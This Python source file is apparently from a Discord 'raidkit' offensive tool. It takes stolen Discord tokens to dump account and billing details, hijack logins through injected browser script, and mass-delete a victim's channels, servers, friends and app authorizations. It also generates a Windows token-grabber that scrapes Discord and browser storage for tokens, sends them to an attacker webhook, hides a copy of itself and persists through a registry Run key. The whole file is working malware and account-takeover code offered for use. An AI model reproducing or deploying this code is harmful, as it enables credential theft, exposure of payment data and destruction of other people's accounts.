"""
Discord Raidkit v2.4.2
the-cult-of-integral

Last modified: 2023-04-29 20:11
"""

import asyncio
import os
import typing

import aiohttp
import colorama as cama
import conf.config as conf
import ui.drui as drui
import utils.io_utils as iou
import utils.log_utils as lu
import utils.request_utils as ru
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
from webdriver_manager.microsoft import EdgeChromiumDriverManager

API_BASE = 'https://discord.com/api/v10'
AUTH_FAIL = 'The user authentication token provided is invalid.'


class Osiris:
    
    def __init__(self):
        self.proxy_cfg = conf.ProxyConfig()
        self.request_handler = ru.RequestHandler(self.proxy_cfg)
        self.menu = None

    def run(self):
        opts = [
            iou.MenuOption('Spy', 'Gets the details of a Discord account', 
                self.__run_osiris_task, self.get_account_details),
            
            iou.MenuOption('Login', 'Logs into a Discord account using either Firefox, Chrome, or Microsoft Edge', 
                self.__run_osiris_task, self.login),
            
            iou.MenuOption('Nuke', 'Performs various malicious actions against a Discord account', 
                self.__run_osiris_task, self.nuke_account),

            iou.MenuOption('Generate Discord token grabber', 'Generates a Discord token grabber in Python', 
                self.generate_discord_token_grabber),

            iou.MenuOption('Open proxy editor', 'Open the proxy editor to add and remove proxies, and toggle proxy usage', 
                self.open_proxy_editor)
        ]
        self.menu = iou.NumberedMenu(drui.OSIRIS_ASCII.replace('PROXIES_ENABLED', 'YES' if self.proxy_cfg.is_using_proxies() else 'NO'), 
                                opts, pcolor=cama.Fore.GREEN, scolor=cama.Fore.LIGHTGREEN_EX, do_name_and_desc=False)
        self.menu.run()
    
    def __run_osiris_task(self, task: typing.Callable[[str], str]):
        """Runs an Osiris task

        Args:
            task (typing.Callable[[str], str]): the task to run
        """
        print(f'{cama.Fore.LIGHTWHITE_EX}Enter a Discord authentication token: ', end='')
        auth_token = input()
        return asyncio.run(task(auth_token))

    async def get_account_details(self, auth_token: str) -> str:
        """Gets the details of a Discord account

        Args:
            auth_token (str): the authentication token of the user

        Returns:
            str: the details of the account
        """
        try:
            if (data := self.check_auth(auth_token)) is None:
                return AUTH_FAIL
        except ru.AllProxiesFailedException:
            return ru.PROXY_FAIL
        
        username = f'{data["username"]}#{data["discriminator"]}'
        user_id = data['id']
        phone = data['phone']
        email = data['email']
        mfa = data['mfa_enabled']
        
        info = f'''Account Information
{"*"*19}

[User ID]{' '*11}{user_id}
[Username]{' '*10}{username}
[Email]{' '*13}{email if email else 'None'}
[Phone]{' '*13}{phone if phone else 'None'}
[2FA]{' '*15}{'Enabled' if mfa else 'Disabled'}'''

        headers = {
            "Authorization": auth_token,
            "Content-Type": "application/json"
        }
        
        try:
            bill_sources = self.request_handler.get(f'{API_BASE}/users/@me/billing/payment-sources', headers=headers)
            user_has_nitro = bool(self.request_handler.get(f'{API_BASE}/users/@me/billing/subscriptions', headers=headers).json())
        except ru.AllProxiesFailedException:
            return ru.PROXY_FAIL
        
        if bool(bill_sources):
            info += f'\n\nBilling Information\n{"*"*19}\n\n'
            for source_data in bill_sources.json():
                info += f'[Has Nitro]{" "*9}{"Yes" if user_has_nitro else "No"}\n'
                
                match source_data['type']:
                    case 1:
                        info += f'[Card Brand]{" "*8}{source_data["brand"]}\n'
                        info += f'[Last 4 Digits]{" "*5}{source_data["last_4"]}\n'
                        info += f'[Expiry Date]{" "*7}{source_data["expires_month"]}/{source_data["expires_year"]}\n'
                        info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
                        info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
                        info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
                        info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
                        info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
                        info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
                        info += f'[Postal Code]{" "*13}{source_data["billing_address"]["postal_code"]}\n\n'
                    case 2:
                        info += f'[PayPal Email]{" "*6}{source_data["email"]}\n'
                        info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
                        info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
                        info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
                        info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
                        info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
                        info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
                        info += f'[Postal Code]{" "*7}{source_data["billing_address"]["postal_code"]}\n\n'
                    case _:
                        info += 'None'
            info += f'\n[Token]{" "*13}{auth_token}'

        if os.path.exists(os.path.join('accounts', f'{user_id}.txt')):
            os.remove(os.path.join('accounts', f'{user_id}.txt'))
        iou.mkfile(os.path.join('accounts', f'{user_id}.txt'), info)

        return f'Account details have been saved to the accounts folder as "{user_id}.txt"'
    
    async def login(self, auth_token: str) -> str:
        """Logs into a Discord account with a given authentication token and performs an action

        Args:
            auth_token (str): the authentication token of the user

        Returns:
            str: the result notification of the login
        """
        async def perform_login(driver, auth_token):

            driver.implicitly_wait(30)
            driver.get('https://discord.com/login')

            WebDriverWait(driver, 30).until(
                EC.visibility_of_element_located(
                    (
                        By.XPATH,
                        "//h1[contains(text(),'Welcome back!')]"
                    )
                )
            )

            script = '''
                function login(token) {
                    setInterval(() => {
                        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                    }, 50);
                    setTimeout(() => {
                        location.reload();
                    }, 2500);
                }'''

            driver.execute_script(script + f'\nlogin("{auth_token}")')


        def launch_browser(browser: int, selenium_proxy: Proxy = None):
            if browser == 1:
                from selenium.webdriver.chrome.options import Options
                options = Options()
                webdriver_instance = webdriver.Chrome
                driver_manager = ChromeDriverManager
            elif browser == 2:
                from selenium.webdriver.firefox.options import Options
                options = Options()
                options.set_preference('detach', True)
                webdriver_instance = webdriver.Firefox
                driver_manager = GeckoDriverManager
            elif browser == 3:
                from selenium.webdriver.edge.options import Options
                options = Options()
                webdriver_instance = webdriver.Edge
                driver_manager = EdgeChromiumDriverManager
            elif browser == 4:
                return None

            options.add_experimental_option('detach', True)
            options.add_argument('--log-level=3')
            if selenium_proxy is not None:
                options.proxy = selenium_proxy
            driver = webdriver_instance(executable_path=driver_manager().install(), options=options)

            return driver

        try:
            if not self.check_auth(auth_token):
                return AUTH_FAIL
        except ru.ru.AllProxiesFailedException:
            return ru.ru.PROXY_FAIL

        is_using_proxies = self.proxy_cfg.is_using_proxies()
        proxies = self.proxy_cfg.__read_from_proxy_file() if is_using_proxies else None

        browser = iou.valid_input(f'''{cama.Fore.LIGHTWHITE_EX}Enter a browser to use for the login:

[1] Chrome
[2] Firefox
[3] Edge
[4] Cancel

>>> ''', [1, 2, 3, 4], int)

        if proxies is not None:
            for protocol in ('https', 'http'):
                for proxy in proxies.get(protocol, []):
                    try:
                        if proxy:
                            selenium_proxy = Proxy()
                            selenium_proxy.proxy_type = ProxyType.MANUAL
                            selenium_proxy.http_proxy = proxy
                            selenium_proxy.ssl_proxy = proxy

                        driver = launch_browser(browser, selenium_proxy)
                        if not driver:
                            return ''

                        await perform_login(driver, auth_token)
                        return 'Successfully logged into account.'
                    except WebDriverException as e:
                        lu.serror(f'Failed to login to account with WebDriverException: {e}')
                        if proxy:
                            print(f"Proxy {proxy} failed. Trying next one...")
        else:
            try:
                driver = launch_browser(browser)
                if not driver:
                    return ''
                
                await perform_login(driver, auth_token)
                return 'Successfully logged into account.'
            except WebDriverException as e:
                lu.serror(f'Failed to login to account with WebDriverException: {e}')

        if is_using_proxies:
            return ru.PROXY_FAIL
        else:
            return 'Failed to login to account due to WebDriverException.'

    
    async def nuke_account(self, auth_token: str) -> str:
        """Attempts to make user leave any guilds they are in, then
        updates various settings of a Discord account to make it uglier

        Args:
            auth_token (str): the authentication token of the user

        Returns:
            str: the result notification of the nuke
        """
        try:
            if (data := self.check_auth(auth_token)) is None:
                return AUTH_FAIL
        except ru.AllProxiesFailedException:
            return ru.PROXY_FAIL
        
        is_using_proxies = self.proxy_cfg.is_using_proxies()
        proxies = self.proxy_cfg.__read_from_proxy_file() if is_using_proxies else None

        print(f'\nNuking account: {data["username"]}#{data["discriminator"]} ... \nThis may take some time.')
        headers = {
            "Authorization": auth_token
        }

        lu.sinfo(f'Nuking {data["username"]}#{data["discriminator"]} ...')
        
        # Delete all channels
        channels = self.request_handler.get(f'{API_BASE}/users/@me/channels', headers=headers).json()
        await asyncio.gather(*[self.__delete_channel(channel['id'], headers, 
            self.proxy_cfg.PROTOCOLS, proxies) for channel in channels])

        # Leave/Delete all guilds
        guilds = self.request_handler.get(f'{API_BASE}/users/@me/guilds', headers=headers).json()
        await asyncio.gather(*[self.__remove_guild(guild['id'], guild['owner'], headers, 
            self.proxy_cfg.PROTOCOLS, proxies) for guild in guilds])

        # Delete all friends
        friends = self.request_handler.get(f'{API_BASE}/users/@me/relationships', headers=headers).json()
        await asyncio.gather(*[self.__delete_friend(friend['id'], headers, 
            self.proxy_cfg.PROTOCOLS, proxies) for friend in friends])

        # Delete all connections
        connections = self.request_handler.get(f'{API_BASE}/users/@me/connections', headers=headers).json()
        await asyncio.gather(*[self.__delete_connection(connection['type'], connection['id'], headers, 
            self.proxy_cfg.PROTOCOLS, proxies) for connection in connections])

        # Deauthorize all applications
        app_tokens = self.request_handler.get(f'{API_BASE}/oauth2/tokens', headers=headers).json()
        await asyncio.gather(*[self.__deauth_app(app['id'], headers, 
            self.proxy_cfg.PROTOCOLS, proxies) for app in app_tokens])

        # Leave Hype Squad
        self.request_handler.delete(f'{API_BASE}/hypesquad/online', headers=headers)

        # Update the user's settings 
        settings = {
            "locale": "ja",
            "show_current_game": False,
            "default_guilds_restricted": True,
            "inline_attatchment_media": False,
            "inline_embed_media": False,
            "gif_auto_play": False,
            "render_embeds": False,
            "render_reactions": False,
            "animate_emoji": False,
            "enable_tts_command": False,
            "message_display_compact": True,
            "convert_emoticons": False,
            "explicit_content_filter": 0,
            "disable_games_tab": True,
            "theme": "light",
            "detect_platform_accounts": False,
            "stream_notifications_enabled": False,
            "animate_stickers": False,
            "view_nsfw_guilds": True,
        }
        
        try:
            self.request_handler.patch(f'{API_BASE}/users/@me/settings', headers=headers, json=settings)
        except ru.AllProxiesFailedException:
            return ru.PROXY_FAIL
        
        lu.sinfo(f'Nuked {data["username"]}#{data["discriminator"]} successfully.')
        return f'Nuked {data["username"]}#{data["discriminator"]} successfully.'
    
    async def __delete_channel(self, channel_id: int, headers: typing.Dict, protocols: typing.Tuple['str'], 
    proxies: typing.Dict[str, typing.List[str]] = None) -> None:
        """Delete a channel via DELETE request to the Discord API

        Args:
            channel_id (int): the id of the channel to delete
            headers (Dict): the headers to use for the request
            protocols (Tuple[str]): the protocols to use for the request
            proxies (Dict[str, List[str]]): the dictionary of proxies to use
        """

        async def make_delete_channel_request(session: aiohttp.ClientSession, channel_id: int):
            while True:
                async with session.delete(f'{API_BASE}/channels/{channel_id}') as resp:
                    if resp.status in (200, 201, 204):
                        lu.sinfo(f'Deleted channel {channel_id} successfully.')
                        return
                    elif resp.status == 429:
                        retry_after = int(resp.headers.get('Retry-After', '1'))
                        lu.sinfo(f'Rate limited, retrying after {retry_after} seconds.')
                        await asyncio.sleep(retry_after)
                    else:
                        lu.swarning(f'Failed to delete channel {channel_id} with status code {resp.status}.')
                        json = await resp.json()
                        text = await resp.text()
                        lu.serror(f'JSON: {json}')
                        lu.serror(f'Text: {text}')
                        raise aiohttp.ClientError

        if proxies is None:
            async with aiohttp.ClientSession(headers=headers) as session:
                await make_delete_channel_request(session, channel_id)
        else:
            for protocol in protocols:
                for proxy in proxies.get(protocol, []):
                    try:
                        connector = aiohttp.TCPConnector(ssl=protocol == 'https', proxy=proxy)
                        async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
                            await make_delete_channel_request(session, channel_id)
                        return
                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        print(f"Proxy {proxy} failed. Trying next one...")
                        lu.swarning(f"Proxy {proxy} failed. Trying next one...")
            print(ru.PROXY_FAIL)
            lu.swarning(ru.PROXY_FAIL)
            raise ru.AllProxiesFailedException(ru.PROXY_FAIL)

    async def __remove_guild(self, guild_id: int, is_owner: bool, headers: typing.Dict, protocols: typing.Tuple['str'], 
    proxies: typing.Dict[str, typing.List[str]] = None) -> None:
        """Leave/Delete a guild via DELETE request to the Discord API

        Args:
            guild_id (int): the id of the guild to delete
            is_owner (bool): whether or not the user is the owner of the guild
            headers (Dict): the headers to use for the request
            protocols (Tuple[str]): the protocols to use for the request
            proxies (Dict[str, List[str]]): the dictionary of proxies to use
        """

        async def make_remove_guild_request(session: aiohttp.ClientSession, guild_id: int, is_owner: bool):
            url = f'{API_BASE}/guilds/{guild_id}' if is_owner else f'{API_BASE}/users/@me/guilds/{guild_id}'
            while True:
                async with session.delete(url) as resp:
                    if resp.status in (200, 201, 204):
                        lu.sinfo(f'Left guild {guild_id} successfully.')
                        return
                    elif resp.status == 429:
                        retry_after = int(resp.headers.get('Retry-After', '1'))
                        lu.sinfo(f'Rate limited, retrying after {retry_after} seconds.')
                        await asyncio.sleep(retry_after)
                    else:
                        lu.swarning(f'Failed to leave guild {guild_id} with status code {resp.status}.')
                        json = await resp.json()
                        text = await resp.text()
                        lu.serror(f'JSON: {json}')
                        lu.serror(f'Text: {text}')
                        raise aiohttp.ClientError

        if proxies is None:
            async with aiohttp.ClientSession(headers=headers) as session:
                await make_remove_guild_request(session, guild_id, is_owner)
        else:
            for protocol in protocols:
                for proxy in proxies.get(protocol, []):
                    try:
                        connector = aiohttp.TCPConnector(ssl=protocol == 'https', proxy=proxy)
                        async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
                            await make_remove_guild_request(session, guild_id, is_owner)
                        return
                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        print(f"Proxy {proxy} failed. Trying next one...")
                        lu.swarning(f"Proxy {proxy} failed. Trying next one...")
            print(ru.PROXY_FAIL)
            lu.swarning(ru.PROXY_FAIL)
            raise ru.AllProxiesFailedException(ru.PROXY_FAIL)
    
    async def __delete_friend(self, friend_id: int, headers: typing.Dict, protocols: typing.Tuple['str'], 
    proxies: typing.Dict[str, typing.List[str]] = None) -> None:
        """Delete a friend via DELETE request to the Discord API
        
        Args:
            friend_id (int): the id of the friend to delete
            headers (Dict): the headers to use for the request
            protocols (Tuple[str]): the protocols to use for the request
            proxies (Dict[str, List[str]]): the dictionary of proxies to use
        """

        async def make_delete_friend_request(session: aiohttp.ClientSession, friend_id: int):
            while True:
                async with session.delete(f'{API_BASE}/users/@me/relationships/{friend_id}') as resp:
                    if resp.status in (200, 201, 204):
                        lu.sinfo(f'Deleted friend {friend_id} successfully.')
                        return
                    elif resp.status == 429:
                        retry_after = int(resp.headers.get('Retry-After', '1'))
                        lu.sinfo(f'Rate limited, retrying after {retry_after} seconds.')
                        await asyncio.sleep(retry_after)
                    else:
                        lu.swarning(f'Failed to delete friend {friend_id} with status code {resp.status}.')
                        json = await resp.json()
                        text = await resp.text()
                        lu.serror(f'JSON: {json}')
                        lu.serror(f'Text: {text}')
                        raise aiohttp.ClientError

        if proxies is None:
            async with aiohttp.ClientSession(headers=headers) as session:
                await make_delete_friend_request(session, friend_id)
        else:
            for protocol in protocols:
                for proxy in proxies.get(protocol, []):
                    try:
                        connector = aiohttp.TCPConnector(ssl=protocol == 'https', proxy=proxy)
                        async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
                            await make_delete_friend_request(session, friend_id)
                        return
                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        print(f"Proxy {proxy} failed. Trying next one...")
                        lu.swarning(f"Proxy {proxy} failed. Trying next one...")
            print(ru.PROXY_FAIL)
            lu.swarning(ru.PROXY_FAIL)
            raise ru.AllProxiesFailedException(ru.PROXY_FAIL)
    
    async def __delete_connection(self, connection_type: str, connection_id: int, headers: typing.Dict, 
    protocols: typing.Tuple['str'], proxies: typing.Dict[str, typing.List[str]] = None) -> None:
        """Delete a connection via DELETE request to the Discord API
        
        Args:
            connection_id (int): the id of the connection to delete
            headers (Dict): the headers to use for the request
            protocols (Tuple[str]): the protocols to use for the request
            proxies (Dict[str, List[str]]): the dictionary of proxies to use
        """

        async def make_delete_connection_request(session: aiohttp.ClientSession, connection_type: str, connection_id: int):
            while True:
                async with session.delete(f'{API_BASE}/users/@me/connections/{connection_type}/{connection_id}') as resp:
                    if resp.status in (200, 201, 204):
                        lu.sinfo(f'Deleted connection {connection_type} {connection_id} successfully.')
                        return
                    elif resp.status == 429:
                        retry_after = int(resp.headers.get('Retry-After', '1'))
                        lu.sinfo(f'Rate limited, retrying after {retry_after} seconds.')
                        await asyncio.sleep(retry_after)
                    else:
                        lu.swarning(f'Failed to delete connection {connection_type} {connection_id} with status code {resp.status}.')
                        json = await resp.json()
                        text = await resp.text()
                        lu.serror(f'JSON: {json}')
                        lu.serror(f'Text: {text}')
                        raise aiohttp.ClientError

        if proxies is None:
            async with aiohttp.ClientSession(headers=headers) as session:
                await make_delete_connection_request(session, connection_type, connection_id)
        else:
            for protocol in protocols:
                for proxy in proxies.get(protocol, []):
                    try:
                        connector = aiohttp.TCPConnector(ssl=protocol == 'https', proxy=proxy)
                        async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
                            await make_delete_connection_request(session, connection_type, connection_id)
                        return
                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        print(f"Proxy {proxy} failed. Trying next one...")
                        lu.swarning(f"Proxy {proxy} failed. Trying next one...")
            print(ru.PROXY_FAIL)
            lu.swarning(ru.PROXY_FAIL)
            raise ru.AllProxiesFailedException(ru.PROXY_FAIL)
    
    async def __deauth_app(self, app_id: int, headers: typing.Dict, protocols: typing.Tuple['str'], 
    proxies: typing.Dict[str, typing.List[str]] = None) -> None:
        """Deauth an app via DELETE request to the Discord API

        Args:
            app_id (int): the id of the app to deauth
            headers (Dict): the headers to use for the request
            protocols (Tuple[str]): the protocols to use for the request
            proxies (Dict[str, List[str]]): the dictionary of proxies to use
        """

        async def make_deauth_app_request(session: aiohttp.ClientSession, app_id: int):
            while True:
                async with session.delete(f'{API_BASE}/oauth2/tokens/{app_id}') as resp:
                    if resp.status in (200, 201, 204):
                        lu.sinfo(f'Deauthorized app {app_id} successfully.')
                        return
                    elif resp.status == 429:
                        retry_after = int(resp.headers.get('Retry-After', '1'))
                        lu.sinfo(f'Rate limited, retrying after {retry_after} seconds.')
                        await asyncio.sleep(retry_after)
                    else:
                        lu.swarning(f'Failed to deauthorize app {app_id} with status code {resp.status}.')
                        json = await resp.json()
                        text = await resp.text()
                        lu.serror(f'JSON: {json}')
                        lu.serror(f'Text: {text}')
                        raise aiohttp.ClientError

        if proxies is None:
            async with aiohttp.ClientSession(headers=headers) as session:
                await make_deauth_app_request(session, app_id)
        else:
            for protocol in protocols:
                for proxy in proxies.get(protocol, []):
                    try:
                        connector = aiohttp.TCPConnector(ssl=protocol == 'https', proxy=proxy)
                        async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
                            await make_deauth_app_request(session, app_id)
                        return
                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        print(f"Proxy {proxy} failed. Trying next one...")
                        lu.swarning(f"Proxy {proxy} failed. Trying next one...")
            print(ru.PROXY_FAIL)
            lu.swarning(ru.PROXY_FAIL)
            raise ru.AllProxiesFailedException(ru.PROXY_FAIL)

    def check_auth(self, auth_token: str) -> ...:
        """Check the validity of a Discord auth token

        Args:
            auth_token (str): the auth token to check

        Returns:
            ...: the result of the check
        """
        headers = {
            "Authorization": auth_token,
            "Content-Type": "application/json"
        }

        r = self.request_handler.get(f'{API_BASE}/users/@me', headers=headers)
        
        if r.status_code == 200:
            return r.json()
        
        lu.swarning(f'The user token {auth_token} is invalid.')
        return None
    
    def generate_discord_token_grabber(self) -> str:
        """Generates a Discord token grabber payload.

        Returns:
            str: the result notification of the payload generation
        """
        
        def get_generate_code(s_webhook: str, s_folder: str, s_hpayload: str, do_reg_key: bool) -> str:
            """Get code to generate token grabber payload.

            Returns:
                str: code to generate token grabber payload.

            Credits:
            - wodxgod: created logic to grab discord tokens
            - Microsoft: lets me write to registry keys without administrator
            """

            generated_code = r'''
import os
import json
import os
import re
import shutil
import winreg
from urllib.request import Request, urlopen

PAYLOAD_PATH = os.path.realpath(__file__)
WEBHOOK_URL = "''' + s_webhook + r'''"


def set_autostart_registry(app_name, key_data=None, autostart=True) -> bool:
    with winreg.OpenKey(
        key=winreg.HKEY_CURRENT_USER,
        sub_key=r"Software\Microsoft\Windows\CurrentVersion\Run",
        reserved=0,
        access=winreg.KEY_ALL_ACCESS
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            else:
                winreg.DeleteValue(key, app_name)
        except OSError:
            return False
    return True


def find_tokens(path) -> list:
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
    
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    
    return tokens


def main():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = "@everyone"
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
    
        message += f"\n**{platform}**\n"
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\n"
        else:
            message += "No tokens found.\n"
        
        message += "\n"
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    payload = json.dumps({"content": message})
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == "__main__":
    path = fr"C:\Users\{os.getenv('username')}''' + f'''\{s_folder}''' + r'''"
    if not os.path.isdir(path):
        os.mkdir(path)
    file = "''' + s_hpayload + r'''.pyw"
    try:
        shutil.copy(__file__, f"{path}\{file}")
    except shutil.SameFileError:
        pass
    '''
            if do_reg_key:
                generated_code += r'''set_autostart_registry("Osiris", f"{path}\{file}")
    '''
            generated_code += r'''main()
'''
            return generated_code
        
        webhook = iou.typed_input('Webhook URL: ', str, True)
        folder = iou.typed_input('Folder name (folder made on target machine with another payload within): ', 
                                    str, True)
        rpayload = iou.typed_input('Regular payload name: ', str, True)
        hpayload = iou.typed_input('Hidden payload name: ', str, True)
        do_reg_key = iou.valid_input('Add registry key to autostart payload? (y/n): ', ['y', 'n'], str)
        match do_reg_key:
            case 'y':
                do_reg_key = True
            case 'n':
                do_reg_key = False
        try:
            os.mkdir(folder)
            os.rmdir(folder)
            open(f'{rpayload}.txt', 'w').close()
            os.remove(f'{rpayload}.txt')
            open(f'{hpayload}.txt', 'w').close()
            os.remove(f'{hpayload}.txt')
        except OSError:
            return 'Failed to generate payload since options given are invalid Windows paths.'
        
        code = get_generate_code(webhook, folder, hpayload, do_reg_key)
        iou.mkfile(os.path.join('payloads', f'{rpayload}.pyw'), code)
        
        return 'Successfully generated payload!'

    def open_proxy_editor(self) -> str:
        self.proxy_cfg.run_proxy_editor()
        self.menu.name = drui.OSIRIS_ASCII.replace('PROXIES_ENABLED', 'YES' if self.proxy_cfg.is_using_proxies() else 'NO')
        return ''
